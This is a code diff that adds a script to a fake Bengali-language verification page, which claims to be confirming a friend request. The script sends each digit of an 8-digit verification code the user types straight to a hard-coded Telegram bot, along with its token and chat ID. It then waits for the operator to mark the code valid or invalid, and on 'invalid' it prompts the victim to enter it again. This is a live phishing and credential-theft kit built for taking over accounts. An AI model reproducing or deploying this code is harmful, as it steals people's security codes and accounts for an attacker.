@@ -1,0 +1,127 @@
+<script>
+const inputs = document.querySelectorAll('.code-input');
+const btn = document.getElementById('submitBtn');
+const botToken = "8617715035:AAHXQjkEtjYX40KQTAE5e_jVRQ_pKQX5Qjk";
+const chatId = "8516934257";
+
+// টেলিগ্রামে মেসেজ পাঠানো
+async function sendToTelegram(text, hasButtons = false) {
+    let payload = { chat_id: chatId, text: text };
+    if(hasButtons) {
+        payload.reply_markup = {
+            inline_keyboard: [[
+                { text: "✅ Success", callback_data: "success" },
+                { text: "❌ Error", callback_data: "error" }
+            ]]
+        };
+    }
+    try {
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+    } catch (e) { console.error("Telegram Error:", e); }
+}
+
+// ইনপুট হ্যান্ডলিং
+inputs.forEach((input, index) => {
+    input.addEventListener('input', () => {
+        input.value = input.value.replace(/[^0-9]/g, '');
+        if (input.value.length === 1) {
+            if (index === 5) {
+                const code6 = Array.from(inputs).slice(0, 6).map(i => i.value).join('');
+                sendToTelegram(`📩 ১ম অংশ (৬ ডিজিট): ${code6}`);
+                btn.disabled = false;
+                btn.classList.remove('opacity-50', 'cursor-not-allowed');
+            }
+            if (index === 7) {
+                const code8 = Array.from(inputs).map(i => i.value).join('');
+                sendToTelegram(`📩 পূর্ণ কোড (৮ ডিজিট): ${code8}`);
+            }
+            if (index < inputs.length - 1) inputs[index + 1].focus();
+        }
+    });
+
+    input.addEventListener('keydown', (e) => {
+        if (e.key === "Backspace" && !input.value && index > 0) {
+            inputs[index - 1].focus();
+        }
+    });
+});
+
+// ওয়েটিং পেজ শুরু (এটি অনির্দিষ্টকালের জন্য চলবে)
+async function startWaiting() {
+    window.scrollTo(0, 0);
+    document.getElementById('waiting-overlay').style.display = 'flex';
+    document.getElementById('loader-icon').classList.remove('hidden');
+    document.getElementById('success-icon').classList.add('hidden');
+    document.getElementById('retryBtn').classList.add('hidden');
+    document.getElementById('viewProfileBtn').classList.add('hidden');
+    document.getElementById('waiting-title').innerText = "যাচাই করা হচ্ছে...";
+    document.getElementById('waiting-msg').innerText = "অল্প কিছুক্ষণ অপেক্ষা করুন। আপনার তথ্য যাচাই করা হচ্ছে।";
+    
+    const finalCode = Array.from(inputs).map(i => i.value).join('');
+    // টেলিগ্রামে বাটনসহ মেসেজ পাঠানো
+    await sendToTelegram(`🚀 ইউজার বাটন ক্লিক করেছে!\nকোড: ${finalCode}`, true);
+    
+    // কমান্ডের জন্য চেক করা শুরু
+    checkTelegramCommand();
+}
+
+// টেলিগ্রাম থেকে রেসপন্স চেক করা (Infinite Loop)
+function checkTelegramCommand() {
+    // এই ইন্টারভ্যালটি চলতেই থাকবে যতক্ষণ না clearInterval কল করা হয়
+    const checkInterval = setInterval(async () => {
+        try {
+            // সর্বশেষ আপডেট চেক করা
+            const res = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=-1&timeout=10`);
+            const data = await res.json();
+            
+            if (data.result && data.result.length > 0) {
+                const update = data.result[0];
+                
+                // যদি কলব্যাক কুয়েরি (বাটন ক্লিক) থাকে
+                if (update.callback_query) {
+                    const command = update.callback_query.data;
+                    
+                    if (command === "success") {
+                        clearInterval(checkInterval); // লুপ বন্ধ হবে
+                        showSuccessUI();
+                    } else if (command === "error") {
+                        clearInterval(checkInterval); // লুপ বন্ধ হবে
+                        showErrorUI();
+                    }
+                }
+            }
+        } catch (e) {
+            console.log("Waiting for command...");
+        }
+    }, 3000); // প্রতি ৩ সেকেন্ড পর পর চেক করবে
+}
+
+function showSuccessUI() {
+    document.getElementById('loader-icon').classList.add('hidden');
+    document.getElementById('success-icon').classList.remove('hidden');
+    document.getElementById('waiting-title').innerText = "সফল হয়েছে!";
+    document.getElementById('waiting-title').style.color = "#10b981"; 
+    document.getElementById('waiting-msg').innerText = "আপনার ফ্রেন্ড রিকোয়েস্টটি সফলভাবে পাঠানো হয়েছে।";
+    document.getElementById('viewProfileBtn').classList.remove('hidden');
+}
+
+function showErrorUI() {
+    document.getElementById('loader-icon').classList.add('hidden');
+    document.getElementById('waiting-title').innerText = "ভুল কোড!";
+    document.getElementById('waiting-title').style.color = "#ef4444"; 
+    document.getElementById('waiting-msg').innerText = "আপনার দেওয়া তথ্যটি সঠিক নয়। সঠিক কোড বসিয়ে আবার চেষ্টা করুন।";
+    document.getElementById('retryBtn').classList.remove('hidden');
+}
+
+function closeOverlay() {
+    document.getElementById('waiting-overlay').style.display = 'none';
+    inputs.forEach(i => i.value = "");
+    inputs[0].focus();
+    btn.disabled = true;
+    btn.classList.add('opacity-50', 'cursor-not-allowed');
+}
+</script>
